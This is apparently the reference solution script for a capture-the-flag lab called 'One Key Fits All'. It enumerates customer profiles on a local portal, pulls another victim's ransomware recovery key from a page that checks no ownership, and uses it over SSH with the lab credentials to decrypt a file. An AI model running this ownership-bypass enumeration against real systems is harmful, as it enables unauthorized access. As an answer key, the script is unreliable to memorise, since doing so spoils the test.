#!/usr/bin/env python3
"""
Reference solve for One Key Fits All.

1. Inspect the portal page source to find the archived-notice path. Follow
   its payment-status link and download the customer directory. Check each
   customer profile until finding the settled one, which identifies a case
   whose page releases a recovery key without checking ownership.
2. SSH into the affected RazerPowerCo machine with the handed credentials.
3. Run the gang's own decryptor tool (already on the box) against the
   locked payload with that stolen key. Because VoidCrypt's kit never
   generates a unique key per victim, the key stolen from a stranger's
   case unlocks our own file too.
4. Confirm the exact flag comes back.

Usage:
    python solve.py --portal http://localhost:8080 --ssh-host 127.0.0.1 \
        --ssh-port 2222 --ssh-user rpc_tech --ssh-pass 'F13ldRecovery!42' \
        --own-id b7f39d21a6048ce5
"""
import argparse
import csv
import io
import re
import sys

import paramiko
import requests

FLAG_RE = re.compile(r"flag\{[^}]+\}")


def find_leaked_key(portal: str, own_id: str):
    """Check customer profiles and use the settled profile's case reference."""
    homepage = requests.get(portal, timeout=10)
    homepage.raise_for_status()
    notice_match = re.search(r"Archived service-status notices:\s*(\S+)", homepage.text)
    if not notice_match:
        return None
    notice = requests.get(f"{portal}{notice_match.group(1)}", timeout=10)
    notice.raise_for_status()
    payment_match = re.search(r'href="([^"]*payment-status[^"]*)"', notice.text)
    if not payment_match:
        return None
    payment = requests.get(f"{portal}{payment_match.group(1)}", timeout=10)
    payment.raise_for_status()
    records_match = re.search(r'href="([^"]*payment-records/[^"]*)"', payment.text)
    if not records_match:
        return None
    report = requests.get(f"{portal}{records_match.group(1)}customers.csv", timeout=10)
    report.raise_for_status()
    rows = csv.DictReader(io.StringIO(report.text))
    for row in rows:
        profile = requests.get(f"{portal}/payment-records/customer/{row['customer_id']}", timeout=10)
        profile.raise_for_status()
        if "SETTLED" not in profile.text:
            continue
        case_match = re.search(r"<code>(\S+)</code>", profile.text)
        if not case_match:
            continue
        vid = case_match.group(1)
        if vid == own_id:
            continue
        r = requests.get(f"{portal}/victim/{vid}", timeout=10)
        if r.status_code != 200:
            continue
        if "PAID" not in r.text:
            continue
        m = re.search(r'<div class="key">([^<]+)</div>', r.text)
        if m:
            return vid, m.group(1).strip()
    return None


def run_decryptor(ssh_host, ssh_port, ssh_user, ssh_pass, key):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ssh_host, port=ssh_port, username=ssh_user, password=ssh_pass, timeout=15)
    cmd = f"cd ~ && ./voidcrypt_recover --key '{key}' locked_dashboard.bin"
    stdin, stdout, stderr = client.exec_command(cmd)
    out = stdout.read().decode(errors="replace")
    exit_status = stdout.channel.recv_exit_status()
    client.close()
    return exit_status, out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--portal", required=True, help="e.g. http://localhost:8080")
    ap.add_argument("--ssh-host", required=True)
    ap.add_argument("--ssh-port", type=int, default=2222)
    ap.add_argument("--ssh-user", required=True)
    ap.add_argument("--ssh-pass", required=True)
    ap.add_argument("--own-id", required=True)
    args = ap.parse_args()

    print(f"[*] Confirming our own case ({args.own_id}) is pending...")
    r = requests.get(f"{args.portal}/victim/{args.own_id}", timeout=10)
    if "PENDING" not in r.text:
        print("[-] Own case did not come back PENDING as expected — check --own-id.")
    else:
        print("[+] Confirmed: our own case is pending, no key released.")

    print("[*] Reviewing customer profiles...")
    found = find_leaked_key(args.portal, args.own_id)
    if not found:
        print("[-] Did not find a settled customer profile with a recovery key.")
        sys.exit(1)
    paid_id, key = found
    print(f"[+] Case {paid_id} is PAID. Leaked recovery key: {key}")

    print(f"[*] SSHing into the affected machine ({args.ssh_host}:{args.ssh_port})...")
    exit_status, out = run_decryptor(args.ssh_host, args.ssh_port, args.ssh_user, args.ssh_pass, key)
    print(out)

    match = FLAG_RE.search(out)
    if exit_status == 0 and match:
        print(f"[+] Flag: {match.group(0)}")
    else:
        print("[-] Decryptor did not return a flag — check the stolen key and SSH creds.")
        sys.exit(1)


if __name__ == "__main__":
    main()
